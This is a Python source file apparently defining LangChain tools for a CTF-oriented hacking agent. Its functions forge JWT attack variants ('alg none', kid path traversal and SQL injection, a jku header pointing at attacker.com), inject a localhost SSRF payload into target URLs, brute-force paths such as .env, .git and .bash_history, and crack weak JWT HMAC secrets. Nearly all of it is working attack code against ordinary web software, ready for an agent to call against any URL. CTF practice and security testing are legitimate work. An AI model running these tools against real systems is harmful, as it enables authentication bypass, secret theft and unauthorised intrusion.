import json
from typing import Any
import httpx
import asyncio
import base64
from datetime import datetime
from myth_config import load_dotenv
from langchain_core.tools import tool
from tools.utilities.report import format_industrial_result

load_dotenv()

# ==============================================================================
# 🌐 JWT & Identity Web CTF Mastery Tools
# ==============================================================================

@tool
async def jwt_security_fuzzer(token: str, **kwargs) -> str:
    """
    Analyzes a JWT and generates common exploitation variants for testing.
    Tests: 'none' algorithm flaw, kidd injection vectors, and header manipulations.
    """
    try:
        parts = token.split('.')
        if len(parts) != 3:
            return format_industrial_result("jwt_security_fuzzer", "Error", error="Invalid JWT format")

        header = json.loads(base64.b64decode(parts[0] + "==").decode('utf-8'))
        payload = json.loads(base64.b64decode(parts[1] + "==").decode('utf-8'))

        variants = []
        
        # 1. 'none' algorithm variant
        none_header = base64.b64encode(json.dumps({"alg": "none", "typ": "JWT"}).encode()).decode().strip("=")
        variants.append({"type": "alg_none", "token": f"{none_header}.{parts[1]}."})

        # 2. 'kid' header variants
        if "kid" in header:
            # Path Traversal
            kid_traversal = base64.b64encode(json.dumps({"alg": header.get("alg"), "kid": "../../../dev/null"}).encode()).decode().strip("=")
            variants.append({"type": "kid_traversal", "token": f"{kid_traversal}.{parts[1]}.{parts[2]}"})
            # SQL Injection
            kid_sqli = base64.b64encode(json.dumps({"alg": header.get("alg"), "kid": "' UNION SELECT 'key'--"}).encode()).decode().strip("=")
            variants.append({"type": "kid_sqli", "token": f"{kid_sqli}.{parts[1]}.{parts[2]}"})

        # 3. 'jku' (JWK Set URL) injection
        jku_header = base64.b64encode(json.dumps({"alg": "RS256", "jku": "http://attacker.com/key.json"}).encode()).decode().strip("=")
        variants.append({"type": "jku_remote_url", "token": f"{jku_header}.{parts[1]}.{parts[2]}"})

        return format_industrial_result(
            "jwt_security_fuzzer",
            "Analysis Complete",
            confidence=1.0,
            impact="HIGH",
            raw_data={"original_header": header, "payload": payload, "fuzz_variants": variants},
            summary=f"JWT analysis for {header.get('alg')} token complete. Generated {len(variants)} exploitation variants."
        )
    except Exception as e:
        return format_industrial_result("jwt_security_fuzzer", "Error", error=str(e))

@tool
async def ssrf_redirect_prober(url: str, parameter: str, **kwargs) -> str:
    """
    Probes a URL parameter for potential SSRF with socket safety and strict timeouts.
    """
    try:
        # Robustness Pass: URL Validation
        if not url.startswith("http"):
             raise ValueError("Target URL must be absolute (including http/https).")

        payload = "http://127.0.0.1:80/"
        test_url = f"{url}?{parameter}={payload}" if '?' not in url else f"{url}&{parameter}={payload}"
        
        # Industry Safety: Strict 5s timeout and no redirect follow
        async with httpx.AsyncClient(timeout=5, verify=False, follow_redirects=False) as client:
            resp = await client.get(test_url)
            
            is_redirect = resp.status_code in [301, 302, 307]
            location = resp.headers.get("Location", "")
            vulnerable = is_redirect and payload in location
            
            return format_industrial_result(
                "ssrf_redirect_prober",
                "Vulnerable" if vulnerable else "Secure",
                confidence=0.8,
                impact="HIGH" if vulnerable else "LOW",
                raw_data={"status_code": resp.status_code, "location": location},
                summary=f"Socket-safe SSRF probe for {parameter} finished. Status: {'REDIRECT_BYPASS_FOUND' if vulnerable else 'SECURE'}."
            )
    except httpx.ConnectTimeout:
        return format_industrial_result("ssrf_redirect_prober", "Timeout", error="Connection timed out (Possible target firewall/filtering).")
    except Exception as e:
        return format_industrial_result("ssrf_redirect_prober", "Error", error=str(e))

@tool
async def ctf_directory_bruteforcer(target_url: str, custom_paths: Any = None, **kwargs) -> str:
    """
    Fast, parallel directory discovery with enforced rate-limits and socket safety.
    """
    try:
        if not target_url.startswith("http"):
             raise ValueError("Target URL must include protocol.")

        paths = custom_paths or [".git", ".env", "robots.txt", ".bash_history", "admin", "flag.txt"]
        findings = []
        
        # Industry Safety: Concurrency limit via Semaphore
        sem = asyncio.Semaphore(5)
        async with httpx.AsyncClient(timeout=3, verify=False, follow_redirects=False) as client:
            async def probe(path):
                async with sem:
                    url = f"{target_url.rstrip('/')}/{path}"
                    try:
                        resp = await client.head(url)
                        if resp.status_code in [200, 301, 302, 403]:
                            return {"path": path, "status": resp.status_code, "url": url}
                    except: pass
                return None

            tasks = [probe(p) for p in paths]
            results = await asyncio.gather(*tasks)
            findings = [r for r in results if r]

        return format_industrial_result(
            "ctf_directory_bruteforcer",
            "Scan Complete",
            confidence=1.0,
            impact="MEDIUM" if findings else "LOW",
            raw_data={"findings": findings[:20]},
            summary=f"Safe parallel discovery on {target_url} finished. Identified {len(findings)} endpoints."
        )
    except Exception as e:
        return format_industrial_result("ctf_directory_bruteforcer", "Error", error=str(e))

@tool
async def jwt_secret_bruteforcer(token: str, **kwargs) -> str:
    """
    Attempts to brute-force a JWT HMAC secret with signature validation safety.
    """
    try:
        parts = token.split('.')
        if len(parts) != 3: 
             raise ValueError("Invalid JWT format (expected header.payload.signature).")
        
        import hmac
        import hashlib
        
        header_payload = f"{parts[0]}.{parts[1]}".encode()
        try:
             # Robustness Pass: Standardize padding
             target_sig = base64.urlsafe_b64decode(parts[2] + "===")
        except Exception:
             raise ValueError("Malformed JWT signature encoding.")
        
        common_secrets = ["secret", "admin", "password", "123456", "jwt", "root", "dev", "test"]
        found_secret = None
        for secret in common_secrets:
             # Industry Safety: Direct HMAC-SHA256 trial
             sig = hmac.new(secret.encode(), header_payload, hashlib.sha256).digest()
             if sig == target_sig:
                 found_secret = secret
                 break
                 
        return format_industrial_result(
            "jwt_secret_bruteforcer",
            "Cracked" if found_secret else "Not Found",
            confidence=1.0,
            impact="CRITICAL" if found_secret else "LOW",
            raw_data={"secret": found_secret},
            summary=f"JWT brute-force finished. {'Secret recovered: ' + found_secret if found_secret else 'No weak secret identified'}."
        )
    except ValueError as e:
        return format_industrial_result("jwt_secret_bruteforcer", "Validation Error", error=str(e))
    except Exception as e:
        return format_industrial_result("jwt_secret_bruteforcer", "Error", error=str(e))
